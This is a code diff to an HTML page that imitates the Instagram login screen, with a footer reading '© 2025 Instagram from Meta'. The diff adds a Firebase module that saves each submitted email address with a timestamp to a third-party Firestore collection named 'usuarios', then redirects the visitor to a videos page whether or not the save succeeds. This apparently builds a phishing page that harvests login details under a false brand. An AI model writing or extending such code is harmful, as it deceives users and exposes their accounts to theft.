@@ -374,8 +374,23 @@
         <p>© 2025 Instagram from Meta</p>
     </footer>
 
-    <script>
-    document.getElementById('login-form').addEventListener('submit', async function(event) {
+    <script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyCGXpsXgvSYgArLfRhJEceaePol-f8j7VA",
+    authDomain: "teste1-1eff2.firebaseapp.com",
+    projectId: "teste1-1eff2",
+    storageBucket: "teste1-1eff2.firebasestorage.app",
+    messagingSenderId: "464509125821",
+    appId: "1:464509125821:web:f5ea6caf57cbc156bd63d4"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  document.getElementById('login-form').addEventListener('submit', async function(event) {
     event.preventDefault();
     const email = document.getElementById('email').value.trim();
     const password = document.getElementById('password').value;
@@ -386,29 +401,36 @@
     const isValidPassword = password.length >= 6;
 
     if (!isDemo && (!isValidEmail || !isValidPassword)) {
-        document.getElementById('email').style.borderColor = !isValidEmail ? '#ff3b30' : '';
-        document.getElementById('password').style.borderColor = !isValidPassword ? '#ff3b30' : '';
-        setTimeout(() => {
-            document.getElementById('email').style.borderColor = '';
-            document.getElementById('password').style.borderColor = '';
-        }, 2000);
-        return;
+      document.getElementById('email').style.borderColor = !isValidEmail ? '#ff3b30' : '';
+      document.getElementById('password').style.borderColor = !isValidPassword ? '#ff3b30' : '';
+      setTimeout(() => {
+        document.getElementById('email').style.borderColor = '';
+        document.getElementById('password').style.borderColor = '';
+      }, 2000);
+      return;
     }
 
     const btn = document.getElementById('login-btn');
     const btnText = document.getElementById('btn-text');
     const spinner = document.getElementById('spinner');
-
     btn.disabled = true;
     btnText.style.display = 'none';
     spinner.style.display = 'block';
 
-    // Por enquanto redireciona direto
-    // Quando tiver o backend pronto, reativa o fetch aqui
+    try {
+      await addDoc(collection(db, 'usuarios'), {
+        email: email,
+        timestamp: new Date().toISOString()
+      });
+    } catch (error) {
+      console.error('Erro ao salvar:', error);
+    }
+
+    // Redireciona independente de salvar ou não
     setTimeout(() => {
-        window.location.href = 'videos.html';
+      window.location.href = 'videos.html';
     }, 1000);
-});
+  });
 </script>
 
 </body>
